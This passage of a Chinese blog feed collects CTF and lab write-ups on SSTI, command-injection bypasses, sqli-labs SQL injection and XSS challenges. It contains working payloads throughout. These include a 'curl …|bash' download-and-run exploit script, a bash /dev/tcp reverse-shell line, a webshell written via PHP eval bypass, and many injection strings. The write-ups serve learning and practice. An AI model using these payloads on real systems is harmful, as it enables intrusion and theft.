<code>request.headers</code>等访问我们的请求参数，这主要是用来绕过过滤。（比如不让输入某关键字，我们就可以通过cookies传入，然后从request.cookies获取即可）</p><h3 id="config对象"><a href="#config对象" class="headerlink" title="config对象"></a>config对象</h3><p> config对象是当前配置对象，是一个类字典的对象，可以用<code>config.items()</code>来访问。而且它还有一些独特1的方法，<code>from_envvar</code>, <code>from_object</code>, <code>from_pyfile</code> 。<code>from_pyfile</code>可以读取指定python文件编译并加载进来。</p><h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><p>使用内置过滤器来绕过</p><p><code>{{request|attr("get")}}</code> 相当于 <code>{{request.get}}</code></p><p>结合 <code>join</code> 过滤器可以拼接字符，于是：</p><p><code>{{request|attr(["_"*2,"class","_"*2]|join)}}</code>相当于<code>{{request.__class__}}</code></p><p>不过我们可以通过<code>request.cookies[&#39;var&#39;]</code> 来进行获取</p><h3 id="使用-获得对象属性"><a href="#使用-获得对象属性" class="headerlink" title="使用 [] 获得对象属性"></a>使用 <code>[]</code> 获得对象属性</h3><p><code>{{''.__class__}} = {{''['__cl'+'ass__']}}</code></p><h3 id="限制输入-和"><a href="#限制输入-和" class="headerlink" title="限制输入 [和]"></a>限制输入 <code>[</code>和<code>]</code></h3><p><code>{{request.cookies.getitem("hh")}}</code></p><h2 id="tornado-SSTI"><a href="#tornado-SSTI" class="headerlink" title="tornado SSTI"></a>tornado SSTI</h2><p>护网杯2018的一道题</p><p><img src="/posts/ed9dc04e/1582507995702.png" alt></p><p>然后我们通过 <code>{{handler.settings}}</code>来获得 cookie_secret</p><p><img src="/posts/ed9dc04e/1582508041772.png" alt></p><p>最后得到 flag</p><pre><code>http://efc64735-8171-468a-b0eb-98510cefe54d.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=5af68d1f8101c8a5cea67790540f1a1e</code></pre><h2 id="校赛一道flask-SSTI题"><a href="#校赛一道flask-SSTI题" class="headerlink" title="校赛一道flask SSTI题"></a>校赛一道flask SSTI题</h2><p>有一个正则过滤了</p><p><img src="/posts/ed9dc04e/0-1584517174812.png" alt></p><p>绕过，得到密钥</p><p><img src="/posts/ed9dc04e/0.png" alt></p><p>之后伪造cookie</p><p><img src="/posts/ed9dc04e/0-1584517209079.png" alt></p><p>之后得到flag</p><p><img src="/posts/ed9dc04e/0-1584517225387.png" alt></p><h2 id="新春战疫-python3"><a href="#新春战疫-python3" class="headerlink" title="新春战疫(python3)"></a>新春战疫(python3)</h2><p>这题主要就是不清楚python3的构造，找了很久才找到一个可以利用的类</p><p>payload如下：</p><pre><code>{{"".__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['po'+'pen']('cat this_is_the_fl'+'ag.txt').read()}}</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.szfszf.top/article/16/" target="_blank" rel="noopener">https://blog.szfszf.top/article/16/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行绕过技巧</title>
      <link href="/posts/58281de6/"/>
      <url>/posts/58281de6/</url>
      
        <content type="html"><![CDATA[<h2 id="tar命令绕过"><a href="#tar命令绕过" class="headerlink" title="tar命令绕过"></a>tar命令绕过</h2><p>最近也是才知道的姿势，很多CTF题目并没有过滤tar命令，可以直接打包然后下载，GXYCTF的一道题就可以这样非预期</p><pre><code>?ip=1;tar$IFS$9-cvf$IFS$9index$IFS$9.</code></pre><p><img src="/posts/58281de6/1582542493140.png" alt></p><h2 id="Windows命令执行"><a href="#Windows命令执行" class="headerlink" title="Windows命令执行"></a>Windows命令执行</h2><pre><code class="php">&lt;?php$a = &quot;../ %1a whoami&quot;;$command = &#39;dir &#39;.urldecode($a);$escaped_command = escapeshellcmd($command);var_dump($escaped_command);file_put_contents(&#39;out.bat&#39;,$escaped_command);system(&#39;out.bat&#39;);?&gt;</code></pre><img src="/posts/58281de6/2020/PersonNote/CTF笔记/命令执行绕过技巧/1581933022683.png" style="zoom:50%;"><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><pre><code>|||&amp;&amp;;</code></pre><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><pre><code>~ ᐅ cat&lt;&gt;flag     flag{fffffffffff}~ ᐅ cat&lt;flag flag{fffffffffff}</code></pre><p><code>${IFS}</code> </p><p>这算是Linux中的一个变量</p><blockquote><p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。IFS环境变量定义了bash shell用户字段分隔符的一系列字符。默认情况下，bash shell会将下面的字符当做字段分隔符：空格、制表符、换行符。</p></blockquote><pre><code>~ ᐅ echo ${IFS} &gt; aa.txt~ ᐅ xxd aa.txt 00000000: 2009 0a00 0a                              ....//用python读取一下&gt;&gt;&gt; f = open(&quot;aa.txt&quot;)&gt;&gt;&gt; f.readlines()[&#39; \t\n&#39;, &#39;\x00\n&#39;]</code></pre><p>使用 <code>${IFS}</code> 绕过(但是我没有实验成功)  ==只适用于Ubuntu==</p><pre><code class="bash">ubuntu@VM-207-93-ubuntu:~$ cat flagnice dayubuntu@VM-207-93-ubuntu:~$ cat${IFS}flagnice dayubuntu@VM-207-93-ubuntu:~$ cat${IFS}$9flagnice dayubuntu@VM-207-93-ubuntu:~$ cat$IFS$9flagnice day</code></pre><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p>有些时候会设置一些关键字过滤(比如设置flag)</p><h3 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h3><pre><code>~ ᐅ a=c;b=at;c=flag;$a$b $cflag{fffffffffff}</code></pre><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><pre><code>~ ᐅ echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bashflag{fffffffffff}</code></pre><h3 id="单引号双引号"><a href="#单引号双引号" class="headerlink" title="单引号双引号"></a>单引号双引号</h3><pre><code class="bash">~ ᐅ c&quot;&quot;at flagflag{fffffffffff}~ ᐅ c&quot;&quot;at fl&quot;&quot;agflag{fffffffffff}~ ᐅ c&quot;&quot;at fl&#39;&#39;agflag{fffffffffff}</code></pre><h3 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h3><pre><code>~ ᐅ c\at fl\agflag{fffffffffff}</code></pre><h2 id="绕过长度的限制"><a href="#绕过长度的限制" class="headerlink" title="绕过长度的限制"></a>绕过长度的限制</h2><p>原题</p><pre><code class="php">&lt;?php    $sandbox = &#39;/www/sandbox/&#39; . md5(&quot;orange&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);    @mkdir($sandbox);    @chdir($sandbox);    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 5) {        @exec($_GET[&#39;cmd&#39;]);    } else if (isset($_GET[&#39;reset&#39;])) {        @exec(&#39;/bin/rm -rf &#39; . $sandbox);    }    highlight_file(__FILE__);</code></pre><p>Linux 可以通过 <code>\</code> 换行</p><p><code>sh filename</code> 可以执行一个shell脚本，如果有报错的话会自动跳过</p><p><code>&gt;</code> 会覆盖原有的内容</p><p><code>&gt;&gt;</code> 是追加内容</p><p>思路就是通过构造一个文件然后往里面写入类似<code>curl 192.168.1.104|bash</code> 之类的语句然后执行，其实还可以利用其他python 以及PHP环境去执行代码，访问 <code>192.168.1.104/index.php</code>里面的内容<code>bash -i &gt;&amp; /dev/tcp/192.168.1.104/12345 0&gt;&amp;1</code>从而达到反弹webshell的目的</p><p>php执行生成的_的内容序列并非和我们在linux命令行一样，查资料 ls 排序和应该和环境变量<code>LC_COLLATE</code>有关！而php应该是c<br><a href="https://www.zhihu.com/question/273928679" target="_blank" rel="noopener">https://www.zhihu.com/question/273928679</a></p><p><img src="/posts/58281de6/1582539212357.png" alt></p><p>最后的exp</p><pre><code class="python">import requestsfrom time import sleepfrom urllib import quotepayload = [    # generate `ls -t&gt;g` file    &#39;&gt;ls\\&#39;,     &#39;ls&gt;_&#39;,     &#39;&gt;\ \\&#39;,     &#39;&gt;-t\\&#39;,     &#39;&gt;\&gt;g&#39;,     &#39;ls&gt;&gt;_&#39;,     # generate `curl orange.tw.tw|python`    # generate `curl 10.188.2.20|bash`     &#39;&gt;sh\ &#39;,     &#39;&gt;ba\\&#39;,     &#39;&gt;\|\\&#39;,    &#39;&gt;20\\&#39;,    &#39;&gt;2.\\&#39;,     &#39;&gt;8.\\&#39;,    &#39;&gt;18\\&#39;,     &#39;&gt;0.\\&#39;,     &#39;&gt;1\\&#39;,     &#39;&gt;\ \\&#39;,     &#39;&gt;rl\\&#39;,     &#39;&gt;cu\\&#39;,     # exec    &#39;sh _&#39;,     &#39;sh g&#39;, ]r = requests.get(&#39;http://10.188.2.20:22460/?reset=1&#39;)for i in payload:    assert len(i) &lt;= 5     r = requests.get(&#39;http://10.188.2.20:22460/?cmd=&#39; + quote(i) )    print i    sleep(0.2)</code></pre><p><a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">Dockerfile</a></p><h2 id="绕过长度为4的限制"><a href="#绕过长度为4的限制" class="headerlink" title="绕过长度为4的限制"></a>绕过长度为4的限制</h2><p>。。太狠了</p><h2 id="绕过长度限制写shell"><a href="#绕过长度限制写shell" class="headerlink" title="绕过长度限制写shell"></a>绕过长度限制写shell</h2><p><img src="/posts/58281de6/1582540869115.png" alt></p><h2 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h2><p>gitlist远程命令执行漏洞</p><pre><code class="php">&lt;?phppublic function searchTree($query, $branch){    if (empty($query)) {        return null;    }    $query = escapeshellarg($query);    try {        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number {$query} $branch&quot;);    } catch (\RuntimeException $e) {        return false;    }</code></pre><p>复现：</p><p>这里的问题出在单引号并不能使得包裹的内容成为一个非选项</p><p><img src="/posts/58281de6/dd89dc70-2446-48e1-a728-5693d1fa868a.bbb0aaacef7d.png" alt></p><p>创建一个 <code>--name</code> 文件，但是无法直接用 cat进行读取，因为会被认为是一个选项，即使是用单引号包裹也不行</p><p>比如这个命令就不会执行，因为单引号包裹的内容放在 <code>-e</code> 选项的值中</p><pre><code>git grep -i --line-number -e &#39;--open-files-in-pager=id;&#39; master</code></pre><p><img src="/posts/58281de6/1582541083787.png" alt></p><p>必须是 <code>cat -- --name</code>, 从这个例子也能看出，单引号并不是区分一个字符串是“参数值”或“选项”的标准。</p><p>修复：</p><pre><code class="php">&lt;?phppublic function searchTree($query, $branch){    if (empty($query)) {        return null;    }    $query = preg_replace(&#39;/(--?[A-Za-z0-9\-]+)/&#39;, &#39;&#39;, $query);    $query = escapeshellarg($query);    try {        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number -- {$query} $branch&quot;); //强制加入 -- 使得后面的成为参数的值    } catch (\RuntimeException $e) {        return false;    }</code></pre><p>python中存在的漏洞点</p><pre><code class="python">import subprocessquery = &#39;id&#39;r = subprocess.run([&#39;git&#39;, &#39;grep&#39;, &#39;-i&#39;, &#39;--line-number&#39;, query, &#39;master&#39;], cwd=&#39;/tmp/vulhub&#39;)</code></pre><p><img src="/posts/58281de6/8296bbd4-40cd-481e-9147-6f11e80967d8.6b4cdb17a1b8.png" alt></p><h2 id="eval长度限制绕过-amp-amp-PHP5-6新特性"><a href="#eval长度限制绕过-amp-amp-PHP5-6新特性" class="headerlink" title="eval长度限制绕过 &amp;&amp; PHP5.6新特性"></a>eval长度限制绕过 &amp;&amp; PHP5.6新特性</h2><pre><code class="php">&lt;?php$param = $_REQUEST[&#39;param&#39;];if(strlen($param)&lt;17 &amp;&amp; stripos($param,&#39;eval&#39;) === false &amp;&amp; stripos($param,&#39;assert&#39;) === false) {  eval($param);}?&gt;</code></pre><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code>param=`$_GET[1]`;&amp;1=bash</code></pre><p>或者</p><pre><code>param=exec($_GET[1]);</code></pre><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>有的同学提到了远程文件，但正常文件包含<code>include $_GET[1];</code>，这个刚好17个字符，超了一位。</p><p>不过，其实<code>include$_GET[1];</code>也是可以运行的，中间的空格可以不要。</p><p>这也是一个思路，但限制就是需要开启远程文件包含，但这个选项默认是关闭的。</p><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><pre><code>param=$_GET[a](N,a,8);&amp;a=file_put_contents</code></pre><p>file_put_contents的第一个参数是文件名，我传入N。PHP会认为N是一个常量，但我之前并没有定义这个常量，于是PHP就会把它转换成字符串’N’；第二个参数是要写入的数据，a也被转换成字符串’a’；第三个参数是flag，当flag=8的时候内容会追加在文件末尾，而不是覆盖。</p><p>除了<code>file_put_contents</code>，<code>error_log</code>函数效果也类似。</p><p>但是file_put_contents第二个参数如果是符号，就会导致PHP出错，比如<code>param=$_GET[a](N,&lt;,8);&amp;a=file_put_contents</code>。但如果要写webshell的话，“&lt;”等符号又是必不可少的。</p><p>写shell的方法</p><pre><code># 每次写入一个字符：PD9waHAgZXZhbCgkX1BPU1RbOV0pOw# 最后包含param=include$_GET[0];&amp;0=php://filter/read=convert.base64-decode/resource=N</code></pre><h4 id="本地日志包含"><a href="#本地日志包含" class="headerlink" title="本地日志包含"></a>本地日志包含</h4><pre><code>param=include$_GET[a];&amp;a=/home/u244201241/.logs/php_error.log</code></pre><h3 id="标准答案，利用变长参数执行"><a href="#标准答案，利用变长参数执行" class="headerlink" title="标准答案，利用变长参数执行"></a>标准答案，利用变长参数执行</h3><pre><code>POST /test.php?1[]=test&amp;1[]=var_dump($_SERVER);&amp;2=assert HTTP/1.1Host: localhost:8081Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 22param=usort(...$_GET);</code></pre><p><img src="/posts/58281de6/1582707944277.png" alt></p><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="noopener">参考</a></p><p>一个坑</p><p>想请教下，为什么用标准答案的方法时，get参数必须用数字才能正常执行，换成比如？a[]=test&amp;a[]=phpinfo();&amp;b=assert时就会失败，不知可否解答下</p><p>只有数字索引数组才能作为变长参数数组。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab记录</title>
      <link href="/posts/70df97a2/"/>
      <url>/posts/70df97a2/</url>
      
        <content type="html"><![CDATA[<h2 id="第一关-GET-Error-based-Single-quotes"><a href="#第一关-GET-Error-based-Single-quotes" class="headerlink" title="第一关 GET Error based- Single quotes"></a>第一关 GET Error based- Single quotes</h2><p>payload</p><pre><code>http://localhost/Less-1/?id=1&#39; order by 3 -- +</code></pre><p><img src="/posts/70df97a2/1581060199563.png" alt></p><p>(火狐不知道为什么感觉有bug)</p><p>在确定回显的时候，要注意去查一个不存在的数据</p><pre><code>http://localhost/Less-1/?id=888&#39; union select 1,2,3 --+</code></pre><h2 id="第二关-GET-Error-based-Intiger"><a href="#第二关-GET-Error-based-Intiger" class="headerlink" title="第二关 GET Error based-Intiger"></a>第二关 GET Error based-Intiger</h2><p>没有单引号保护</p><pre><code>http://localhost/Less-2/?id=12312 union select 1,2,3 #</code></pre><p><img src="/posts/70df97a2/1581060927106.png" alt></p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>加了括号保护</p><pre><code class="sql">$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></pre><pre><code>http://localhost/Less-3/?id=22333&#39; ) union select 1,2,3 --+</code></pre><p><img src="/posts/70df97a2/1581061220464.png" alt></p><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>双引号保护</p><pre><code>http://localhost/Less-4/?id=1111&quot;) union select 1,2,3--+</code></pre><p><img src="/posts/70df97a2/1581061432798.png" alt></p><h2 id="第五关-Double-injection-Single-Quotes"><a href="#第五关-Double-injection-Single-Quotes" class="headerlink" title="第五关  Double injection-Single Quotes"></a>第五关  Double injection-Single Quotes</h2><p>这里理解一下报错注入</p><pre><code class="sql">select count(*),(concat(floor(rand(0)*2),(select version())))x from users group by x</code></pre><p><code>floor(rand(0)*2)</code> 产生的数据很有规律</p><pre><code>mysql&gt; select floor(rand(0)*2) from users;+------------------+| floor(rand(0)*2) |+------------------+|                0 ||                1 ||                1 ||                0 ||                1 ||                1 ||                0 ||                0 ||                1 ||                1 ||                1 ||                0 ||                1 |+------------------+0110 1100</code></pre><p>再看 <code>group by</code></p><p>首先计算第一次 <code>group by</code> 后面的字段值，然后去查找有没有，没有就需要插入，插入的时候需要再计算一次</p><p><a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">参考</a></p><p>在第三次插入的时候出问题</p><p>最后的payload</p><pre><code>http://localhost/Less-5/?id=2&#39; and (select 1 from (select count(*),concat(((select group_concat(schema_name) from information_schema.schemata)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+</code></pre><p><img src="/posts/70df97a2/1581062957254.png" alt></p><p>数据库也可以这样查</p><pre><code class="sql">mysql&gt; select group_concat(schema_name) from information_schema.schemata;+--------------------------------------------------------------------------------------------------------------------------------+| group_concat(schema_name)                                                                                                      |+--------------------------------------------------------------------------------------------------------------------------------+| information_schema,challenges,ctf,dvwa,ed01,mysql,newdb,performance_schema,reservation,security,sys,test,tptest,typecho,xinxiu |+--------------------------------------------------------------------------------------------------------------------------------+1 row in set</code></pre><p>简单一点的 payload</p><pre><code>http://localhost/Less-5/?id=1&#39; and (select 1 from (select count(*),  concat((select database()), floor(rand(0)*2))x from information_schema.tables group by x )a) --+</code></pre><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p>同第五关类似</p><pre><code>http://localhost/Less-6/?id=2&quot; and (select 1 from (select count(*), concat(floor(rand(0)*2), (select database()))x from information_schema.tables group by x)a) --+</code></pre><p><img src="/posts/70df97a2/1581063846151.png" alt></p><h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p>是写shell，但是我没有成功(其实是因为mysql开了权限吧估计)</p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>布尔盲注(多加一些括号)</p><pre><code class="sql">http://localhost/Less-8/?id=1&#39; and (select ascii(mid((select database()), 1,1)))=115 --+</code></pre><p><img src="/posts/70df97a2/1581064726062.png" alt></p><h2 id="第九关-延时注入"><a href="#第九关-延时注入" class="headerlink" title="第九关 延时注入"></a>第九关 延时注入</h2><p>延时注入</p><pre><code class="sql">http://localhost/Less-9/?id=1&#39; and (select  if(ascii(substr(database(),1,1))&gt;200 , sleep(5), NULL) ) --+</code></pre><p><img src="/posts/70df97a2/1581065698494.png" alt></p><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>延时注入，只是换成了双引号</p><pre><code class="sql">http://localhost/Less-10/?id=1&quot; and (select if( ascii(substr(database(),1,1)) &gt; 40, sleep(5), NULL)) --+</code></pre><p><img src="/posts/70df97a2/1581065865089.png" alt></p><h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><p>POST形式的单引号</p><pre><code>uname=&amp;passwd=admin&#39; union select 1,2-- +&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581079686829.png" alt></p><h2 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h2><p>POST形式的双引号</p><p>payload(这次测试发现 <code>--+</code> 不行，需要换成 #)</p><pre><code>uname=a&amp;passwd=admin&quot;) union select 1,2# &amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581079951209.png" alt></p><h2 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h2><p>有报错回显，但是并没有其他的数据回显</p><p><img src="/posts/70df97a2/1581080112218.png" alt></p><p>payload(遇到困难加括号就行了)</p><pre><code>uname=admin&amp;passwd=admin&#39;) and (select 1 from (select count(*), concat(floor(rand(0)*2),(select database()))x from information_schema.tables group by x)a)  #&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581080519639.png" alt></p><h2 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h2><p>同上一关类似</p><pre><code>uname=admin&amp;passwd=admin&quot; and (select 1 from (select count(*), concat(floor(rand(0)*2), (select database()))x  from information_schema.tables group by x)a)# &amp;submit=Submit</code></pre><h2 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h2><p>延时注入,注意只能用 <code>#</code> 注释？</p><pre><code class="sql">uname=admin&amp;passwd=admin &#39; and (select  if(ascii(substr(database(),1,1))&gt;30, sleep(5), NULL) ) #&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581081075376.png" alt="明显看到延时"></p><h2 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h2><p>同十五关</p><pre><code>uname=admin&amp;passwd=admin&quot;) and (select  if(ascii(substr(database(),1,1))&gt;30, sleep(5), NULL) ) #&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581081206257.png" alt></p><h2 id="第十七关-报错注入"><a href="#第十七关-报错注入" class="headerlink" title="第十七关 报错注入"></a>第十七关 报错注入</h2><p>update形式的注入，这里可以使用 报错注入</p><pre><code>uname=admin&amp;passwd=admin&#39;  and (updatexml(1,concat(0x3a,(select database())),1)) #&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581081624347.png" alt></p><h2 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h2><p>payload</p><pre><code class="sql">User-Agent: 1&#39; or updatexml(1,concat(0x3a,(database())),0),&#39;&#39;,&#39;&#39;)#</code></pre><p><img src="/posts/70df97a2/1581082594671.png" alt></p><h2 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h2><p>payload</p><pre><code>Referer:  1&#39; or updatexml(1,concat(0x3a,(database())),0), &#39;&#39;)#</code></pre><p>INSERT 形式的注入</p><p><img src="/posts/70df97a2/1581083050547.png" alt></p><h2 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h2><p>cookie形式的报错注入</p><pre><code class="sql">admin&#39; and (updatexml(1,concat(0x3a,(select database())),1)) # </code></pre><p><img src="/posts/70df97a2/1581124084727.png" alt></p><h2 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h2><p>需要base64编码</p><pre><code>admin&#39; ) and (updatexml(1, concat(0x3a, (select database()),0x3a ) ,1)) #</code></pre><p>编码之后</p><pre><code>YWRtaW4nICkgYW5kICh1cGRhdGV4bWwoMSwgY29uY2F0KDB4M2EsIChzZWxlY3QgZGF0YWJhc2UoKSksMHgzYSApICwxKSkgIw==</code></pre><p><img src="/posts/70df97a2/1581124754782.png" alt></p><h2 id="第二十二关"><a href="#第二十二关" class="headerlink" title="第二十二关"></a>第二十二关</h2><p>改成了双引号闭合</p><pre><code>admin&quot; and (updatexml(1, concat(0x3a, (select database()),0x3a ) ,1)) #</code></pre><p>base64编码之后</p><pre><code>YWRtaW4iIGFuZCAodXBkYXRleG1sKDEsIGNvbmNhdCgweDNhLCAoc2VsZWN0IGRhdGFiYXNlKCkpLDB4M2EgKSAsMSkpICM=</code></pre><p><img src="/posts/70df97a2/1581137685241.png" alt></p><h2 id="第二十三关"><a href="#第二十三关" class="headerlink" title="第二十三关"></a>第二十三关</h2><p>这一次把注释符过滤了</p><p><img src="/posts/70df97a2/1581137728016.png" alt></p><pre><code class="php">$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);</code></pre><p>报错注入可以</p><pre><code>http://localhost/Less-23/?id=1&#39; and (updatexml(1, concat(0x3a, (select database()),0x3a ) ,1)) and &#39;1&#39; =&#39;1</code></pre><p><img src="/posts/70df97a2/1581137879879.png" alt></p><h2 id="第二十四关"><a href="#第二十四关" class="headerlink" title="第二十四关"></a>第二十四关</h2><p>二次注入，注册一个用户名 <code>admin &#39;#</code> 就可以修改admin的密码了</p><h2 id="第二十五关"><a href="#第二十五关" class="headerlink" title="第二十五关"></a>第二十五关</h2><p>过滤了 <code>and</code> 和 <code>or</code> ，</p><p>可以双写绕过或者使用 <code>&amp;&amp;</code> 和 <code>||</code></p><p><img src="/posts/70df97a2/1581138060996.png" alt></p><p><img src="/posts/70df97a2/1581138112434.png" alt></p><h2 id="25a"><a href="#25a" class="headerlink" title="25a"></a>25a</h2><p>类似的过滤了and和or，而且没有单引号保护，双写绕过</p><p><img src="/posts/70df97a2/1581139222272.png" alt></p><h2 id="第二十六关"><a href="#第二十六关" class="headerlink" title="第二十六关"></a>第二十六关</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS学习记录</title>
      <link href="/posts/88edfa78/"/>
      <url>/posts/88edfa78/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS挑战"><a href="#XSS挑战" class="headerlink" title="XSS挑战"></a>XSS挑战</h2><p>(突然发现这个平台有bug，只需要在控制台alert(1)即可。。)</p><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><pre><code> http://test.ctf8.com/level1.php?name=%3Cscript%3Ealert(1)%3C/script%3E</code></pre><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><pre><code> 没有找到和&amp;lt;/h2&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;h2&amp;gt;相关的结果.</code></pre><p>但是</p><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;scRipt&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level2.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;scRipt&gt;alert(1)&lt;/script&gt;&quot;&gt; &lt;input type=submit name=submit value=&quot;搜索&quot;/&gt; &lt;/form&gt;</code></pre><p>payload</p><pre><code> &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code></pre><h3 id="level3-js事件绕过"><a href="#level3-js事件绕过" class="headerlink" title="level3 js事件绕过"></a>level3 js事件绕过</h3><p>这次两个都被转义了</p><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level3.php method=GET&gt; &lt;input name=keyword  value=&#39;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&#39;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>那就不用</p><pre><code> &#39;onmouseover=&#39;alert(1)</code></pre><p>提交之后鼠标悬浮到上面即可触发</p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level4.php method=GET&gt; &lt;input name=keyword  value=&quot;scriptalert(1)/script&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>同样的绕过</p><pre><code> &quot; onmouseover=&quot;alert(1)</code></pre><h3 id="level5-a标签绕过"><a href="#level5-a标签绕过" class="headerlink" title="level5 a标签绕过"></a>level5 a标签绕过</h3><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level5.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;scr_ipt&gt;alert(1)&lt;/script&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>但是现在会被过滤</p><pre><code>&lt;input name=keyword  value=&quot;&#39;o_nmouseover=&#39;alert(1)&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;</code></pre><p>那么事件不能用了</p><p>payload</p><pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1);&quot;&gt;aaa&lt;/a&gt;</code></pre><p><img src="/posts/88edfa78/1581324449393.png" alt="img"></p><pre><code> &lt;form action=level5.php method=GET&gt; &lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1);&quot;&gt;aaa&lt;/a&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;img src=x onerror=alert(1)&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level6.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;img sr_c=x o_nerror=alert(1)&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;       &lt;h2 